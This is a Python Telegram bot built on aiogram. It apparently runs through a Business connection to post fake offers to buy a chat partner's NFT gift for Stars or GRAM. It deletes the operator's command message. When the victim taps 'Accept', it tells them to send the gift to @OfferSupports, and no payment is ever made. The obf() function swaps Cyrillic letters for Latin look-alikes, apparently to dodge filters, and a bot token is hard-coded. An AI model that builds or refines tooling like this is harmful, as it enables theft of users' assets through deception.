import asyncio, re, random, string, logging, os
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8469662681:AAHFWXO0AIIo_1PbYL4hAjg0qMHo_yA1R-c"
RECIPIENT = "OfferSupports"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_GEM, E_OK, E_NO, E_TIMER, E_GIFT, E_STAR, E_WARN, E_CHECK, E_LOCK = (
    "5318901904686754959", "5774022692642492953", "5774077015388852135",
    "6037268453759389862", "5773677501825945508", "6028338546736107668",
    "6030563507299160824", "5774022692642492953", "5774077015388852135",
)

DUP = {
    'а': 'a', 'е': 'e', 'о': 'o', 'с': 'c', 'р': 'p', 'х': 'x', 'у': 'y', 'к': 'k',
    'А': 'A', 'Е': 'E', 'О': 'O', 'С': 'C', 'Р': 'P', 'Х': 'X', 'У': 'Y', 'К': 'K',
}

def obf(s):
    out = []
    count = 0
    for ch in s:
        if ch in DUP:
            count += 1
            if count % 3 == 0:
                out.append(DUP[ch]); continue
        out.append(ch)
    return "".join(out)

def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'

def parse_command(text):
    if not text: return None
    parts = text.strip().split()
    if not parts: return None
    if parts[0].startswith("/"): parts = parts[1:]
    if parts and parts[0].startswith("@"): parts = parts[1:]
    if not parts: return None
    link, amount = None, None
    currency, lang = "STARS", "ru"
    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p; continue
        if low in LANG_TAGS:
            if low == "ru": lang = "ru"
            elif low in ("ukr","uk"): lang = "ukr"
            elif low in ("eng","en"): lang = "eng"
            elif low in ("cn","zh"): lang = "cn"
            continue
        if low == "gram": currency = "GRAM"; continue
        if low in ("stars","star","звёзд","звезд","звёзды","звезды"): currency = "STARS"; continue
        if amount is None:
            try: amount = int(float(p.replace(",", ".")))
            except ValueError: pass
    if not link or amount is None: return None
    return link, amount, currency, lang

def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m: return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num

def amount_line(amount, currency):
    if currency == "GRAM":
        return f'{amount} {em(E_GEM, "💎")}'
    return f'{amount} {em(E_STAR, "⭐")}'

def build_offer_text(amount, currency, gift_name, gift_num, order_id, nft_url):
    return (
        f'{em(E_GIFT, "🎁")} {obf("Пользователь предлагает Вам")}\n\n'
        f'{amount_line(amount, currency)} {obf("за подарок")} <a href="{nft_url}">{gift_name} #{gift_num}</a>.\n\n'
        f'{em(E_TIMER, "⏱")} {obf("Предложение действует ещё 6 ч. 0 мин.")}'
    )

def build_accept_text(amount, currency, gift_name, gift_num, order_id, nft_url):
    return (
        f'{em(E_CHECK, "✅")} <b>{obf("Оффер принят")}</b>\n\n'
        f'{em(E_GIFT, "🎁")} {obf("Подарок")}: <a href="{nft_url}">{gift_name} #{gift_num}</a>.\n'
        f'{obf("Получатель")}: @{RECIPIENT}.\n\n'
        f'{amount_line(amount, currency)} {obf("за подарок")}.\n\n'
        f'{obf("Отправьте подарок и нажмите «Готово».")}'
    )

def make_offer_keyboard(order_id):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data=f"decl|{order_id}", icon_custom_emoji_id=E_NO),
        InlineKeyboardButton(text="Принять", callback_data=f"acc|{order_id}", icon_custom_emoji_id=E_OK),
    ]])

def make_accept_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отправить подарок", url=f"tg://send_gift?to={RECIPIENT}", icon_custom_emoji_id=E_GIFT)],
        [InlineKeyboardButton(text="Готово", callback_data="noop", icon_custom_emoji_id=E_CHECK)],
    ])

def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))

OFFERS = {}

@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid: return
    parsed = parse_command(message.text or "")
    if not parsed: return
    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift: return
    gift_name, gift_num = gift

    slug = gift_name.replace(" ", "")
    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()
    OFFERS[order_id] = (amount, currency, gift_name, gift_num, bcid, nft_url)

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_text(amount, currency, gift_name, gift_num, order_id, nft_url),
            reply_markup=make_offer_keyboard(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"send: {e}")
        return

    try:
        await bot.delete_business_messages(business_connection_id=bcid, message_ids=[message.message_id])
    except Exception as e:
        logging.error(f"del: {e}")

@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("🎁 https://t.me/nft/SnoopDogg-9545 ru 3000 STARS")

@dp.callback_query(F.data.startswith("acc|"))
async def accept(cb: CallbackQuery):
    # Сразу подтверждаем нажатие, чтобы Telegram не оставлял кнопку в состоянии загрузки.
    if not cb.message or not cb.data:
        await cb.answer("Сообщение недоступно", show_alert=True)
        return

    parts = cb.data.split("|", 1)
    if len(parts) != 2 or not parts[1]:
        await cb.answer("Некорректный номер оффера", show_alert=True)
        return

    order_id = parts[1]
    data = OFFERS.get(order_id)
    if not data:
        await cb.answer("Оффер не найден. Возможно, бот перезапускался — создайте оффер заново.", show_alert=True)
        return

    amount, currency, gift_name, gift_num, bcid, nft_url = data
    kwargs = {
        "chat_id": cb.message.chat.id,
        "message_id": cb.message.message_id,
        "text": build_accept_text(amount, currency, gift_name, gift_num, order_id, nft_url),
        "reply_markup": make_accept_keyboard(),
        "parse_mode": ParseMode.HTML,
        "link_preview_options": LinkPreviewOptions(is_disabled=True),
    }
    if bcid:
        kwargs["business_connection_id"] = bcid

    try:
        await bot.edit_message_text(**kwargs)
    except TelegramBadRequest as e:
        # Повторное нажатие на уже обработанный оффер не считается ошибкой.
        if "message is not modified" in str(e).lower():
            await cb.answer("Оффер уже принят")
            return
        logging.exception("Не удалось обработать кнопку Принять")
        await cb.answer(f"Не удалось принять оффер: {e}", show_alert=True)
        return
    except Exception as e:
        logging.exception("Ошибка обработчика кнопки Принять")
        await cb.answer("Внутренняя ошибка. Проверьте логи бота.", show_alert=True)
        return

    await cb.answer("Оффер принят")

@dp.callback_query(F.data.startswith("decl|"))
async def decline(cb: CallbackQuery):
    if not cb.message:
        await cb.answer("Устарело", show_alert=True); return
    order_id = cb.data.split("|")[1]
    data = OFFERS.get(order_id)
    if not data:
        await cb.answer("Оффер устарел", show_alert=True); return
    _, _, _, _, bcid, _ = data

    kwargs = {
        "chat_id": cb.message.chat.id,
        "message_id": cb.message.message_id,
        "text": f'{em(E_NO, "❌")} <b>{obf("Оффер отклонён.")}</b>',
        "reply_markup": None,
        "parse_mode": ParseMode.HTML,
        "link_preview_options": LinkPreviewOptions(is_disabled=True),
    }
    if bcid:
        kwargs["business_connection_id"] = bcid

    try:
        await bot.edit_message_text(**kwargs)
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            logging.error(f"decline edit: {e}")
    await cb.answer()

@dp.callback_query(F.data == "noop")
async def noop(cb: CallbackQuery):
    await cb.answer()

async def main():
    await dp.start_polling(
        bot,
        allowed_updates=["callback_query", "business_connection", "business_message", "edited_business_message"],
    )

if __name__ == "__main__":
    asyncio.run(main())
